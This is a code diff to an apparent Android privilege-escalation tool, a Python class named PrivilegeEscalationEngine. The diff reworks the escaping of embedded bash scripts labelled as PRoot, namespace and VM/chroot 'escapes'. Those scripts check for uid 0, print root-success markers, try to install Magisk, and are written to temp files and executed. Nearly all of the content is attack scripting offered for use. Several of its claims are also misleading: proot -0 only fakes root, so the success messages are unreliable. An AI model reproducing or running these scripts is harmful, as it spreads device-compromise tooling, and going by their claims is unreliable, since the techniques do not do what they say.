@@ -267,18 +267,18 @@ class PrivilegeEscalationEngine:
             logger.info("Attempting PRoot escape...")
 
             # Create escape script
-            escape_script = f"""#!/bin/bash
+            escape_script_template = r"""#!/bin/bash
 # PRoot escape technique for Android privilege escalation
 export PROOT_TMP_DIR=/data/local/tmp/proot_escape
 mkdir -p $PROOT_TMP_DIR
 
 # Method 1: Bind mount escape
-proot -0 -r / -b /dev -b /proc -b /sys -b /data \\\$
-    -w /data/local/tmp \\\$
-    -q qemu-aarch64 \\\$
+proot -0 -r / -b /dev -b /proc -b /sys -b /data \
+    -w /data/local/tmp \
+    -q qemu-aarch64 \
     /bin/bash -c "
         # Test root access
-        if [ \$(id -u) -eq 0 ]; then
+        if [ $(id -u) -eq 0 ]; then
             echo 'ROOT_ACCESS_ACHIEVED'
             # Install Magisk if not present
             if [ ! -f /data/adb/magisk/magisk ]; then
@@ -296,6 +296,8 @@ proot -0 -r / -b /dev -b /proc -b /sys -b /data \\\$
         fi
     "
 """
+
+            escape_script = escape_script_template
 
             # Write and execute escape script
             script_path = tempfile.mktemp(suffix=".sh")
@@ -667,7 +669,7 @@ int main() {
             logger.info("Attempting namespace escape...")
 
             # Create namespace escape script
-            escape_script = """#!/bin/bash
+            escape_script = r"""#!/bin/bash
 # Namespace escape for Android privilege escalation
 
 # Method 1: PID namespace escape
@@ -760,14 +762,14 @@ unshare -U /bin/bash -c "
             alpine_url = "https://dl-cdn.alpinelinux.org/alpine/v3.22/releases/aarch64/alpine-uboot-3.22.1-aarch64.tar.gz"
 
             # Create VM startup script
-            vm_script = f"""#!/bin/bash
+            vm_script_template = r"""#!/bin/bash
 # Minimal Linux VM for privilege escalation
 
 # Create basic rootfs structure
-mkdir -p {rootfs_dir}/{{bin,sbin,etc,proc,sys,dev,tmp,root}}
+mkdir -p ROOTFS_DIR/{bin,sbin,etc,proc,sys,dev,tmp,root}
 
 # Create init script
-cat > {rootfs_dir}/init << 'EOF'
+cat > ROOTFS_DIR/init << 'EOF'
 #!/bin/sh
 mount -t proc proc /proc
 mount -t sysfs sysfs /sys
@@ -783,25 +785,25 @@ ip link set lo up
 exec /bin/sh
 EOF
 
-chmod +x {rootfs_dir}/init
+chmod +x ROOTFS_DIR/init
 
 # Boot VM with QEMU (if available)
 if command -v qemu-system-aarch64 >/dev/null 2>&1; then
-    qemu-system-aarch64 \\\$
-        -M virt \\\$
-        -cpu cortex-a57 \\\$
-        -m 256M \\\$
-        -nographic \\\$
-        -kernel /boot/vmlinuz \\\$
-        -initrd {rootfs_dir} \\\$
-        -append "console=ttyAMA0 init=/init" \\\$
-        -netdev user,id=net0 \\\$
+    qemu-system-aarch64 \
+        -M virt \
+        -cpu cortex-a57 \
+        -m 256M \
+        -nographic \
+        -kernel /boot/vmlinuz \
+        -initrd ROOTFS_DIR \
+        -append "console=ttyAMA0 init=/init" \
+        -netdev user,id=net0 \
         -device virtio-net,netdev=net0 &
     
-    VM_PID=\$!
+    VM_PID=$!
     sleep 10
     
-    if kill -0 \$VM_PID 2>/dev/null; then
+    if kill -0 $VM_PID 2>/dev/null; then
         echo "VM_BOOT_SUCCESS"
     else
         echo "VM_BOOT_FAILED"
@@ -811,18 +813,20 @@ else
     echo "QEMU not available, using chroot container..."
     
     # Setup basic chroot environment
-    cp /bin/sh {rootfs_dir}/bin/
-    cp /bin/ls {rootfs_dir}/bin/
-    cp /bin/id {rootfs_dir}/bin/
+    cp /bin/sh ROOTFS_DIR/bin/
+    cp /bin/ls ROOTFS_DIR/bin/
+    cp /bin/id ROOTFS_DIR/bin/
     
     # Chroot and test
-    chroot {rootfs_dir} /bin/sh -c "
-        if [ \$(id -u) -eq 0 ]; then
+    chroot ROOTFS_DIR /bin/sh -c "
+        if [ $(id -u) -eq 0 ]; then
             echo 'CHROOT_ROOT_SUCCESS'
         fi
     "
 fi
 """
+            
+            vm_script = vm_script_template.replace("ROOTFS_DIR", rootfs_dir)
 
             script_path = tempfile.mktemp(suffix=".sh")
             with open(script_path, "w") as f:
